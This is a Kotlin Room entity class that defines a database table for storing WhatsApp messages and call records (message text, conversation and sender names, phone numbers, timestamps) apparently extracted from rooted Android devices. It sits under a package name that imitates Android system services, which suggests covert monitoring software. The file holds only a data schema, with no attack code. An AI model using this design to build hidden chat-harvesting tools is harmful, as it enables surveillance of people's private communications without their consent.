package com.android.services.db.entities

import androidx.room.ColumnInfo
import androidx.room.Entity
import androidx.room.PrimaryKey
import java.util.*

@Entity(tableName = "whats_app_rooted")
data class WhatsAppRooted(

    @PrimaryKey @ColumnInfo(name = "message_id")
    var messageId: String = "",

    @ColumnInfo(name = "conversation_id")
    var conversationId: String = "",

    @ColumnInfo(name = "conversation_name")
    var conversationName: String = "",

    @ColumnInfo(name = "message")
    var message: String = "",

    @ColumnInfo(name = "type")
    var type: String = "",

    @ColumnInfo(name = "message_datetime")
    var messageDatetime: String = "",

    @ColumnInfo(name = "sender_number")
    var senderNumber: String = "",

    @ColumnInfo(name = "sender_name")
    var senderName: String = "",

    @ColumnInfo(name = "is_call")
    var isCall: Boolean = false,

    @ColumnInfo(name = "call_duration")
    var duration: String = "",

    @ColumnInfo(name = "date")
    @Transient
    var date: Date = Date(),

    @ColumnInfo(name = "timeStamp")
    @Transient
    var timeStamp: Long = 0L,

    @ColumnInfo(name = "status")
    @Transient
    var status: Int = 0
)